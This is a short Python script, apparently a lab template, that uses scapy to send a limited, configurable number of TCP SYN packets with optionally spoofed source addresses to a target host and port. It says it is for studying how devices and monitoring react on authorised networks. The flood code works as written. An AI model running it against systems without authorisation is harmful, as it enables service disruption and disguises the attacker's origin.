from __future__ import annotations

"""
Prebuilt lab script: malformed_syn_flood.py

Sends a limited number of TCP SYN packets (optionally spoofed) to a target.
This is intended for lab networks you own or are explicitly authorised to test,
to study how devices and monitoring stacks react to aggressive but bounded SYN flows.
"""

from typing import Any

from scapy.all import IP, TCP, send  # type: ignore[import-untyped]


def run(ctx: Any) -> dict:
    """Template: limited SYN flood against a target.

    Parameters via ScriptJob.params / ctx.params:
      {
        "target_ip": "10.0.0.5",
        "target_port": 80,
        "count": 50,
        "spoof": true
      }

    This is intended for lab use on networks you own or are authorized to test.
    By default, it sends a small number of packets; increase `count` explicitly
    if you need more volume.
    """
    params = getattr(ctx, "params", {}) or {}
    target_ip = params.get("target_ip")
    target_port = int(params.get("target_port", 80))
    count = int(params.get("count", 20))
    spoof = bool(params.get("spoof", True))

    if not target_ip:
        raise ValueError("target_ip is required")

    ctx.logger(
        f"malformed_syn_flood: sending {count} SYN packets to {target_ip}:{target_port} "
        f"(spoof={spoof})"
    )

    pkts = []
    for _ in range(count):
        if spoof:
            # Use a randomized source IP within RFC1918 range
            src_ip = f"192.168.{_ % 254}.{(_ * 7) % 254 or 1}"
        else:
            src_ip = "0.0.0.0"

        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=12345, dport=target_port, flags="S", seq=1000)
        pkts.append(ip / tcp)

    # send() is sync; keep the total packet count small by default.
    send(pkts, verbose=False)

    ctx.logger("malformed_syn_flood: completed")
    return {"status": "sent", "packets": len(pkts), "target_ip": target_ip, "target_port": target_port}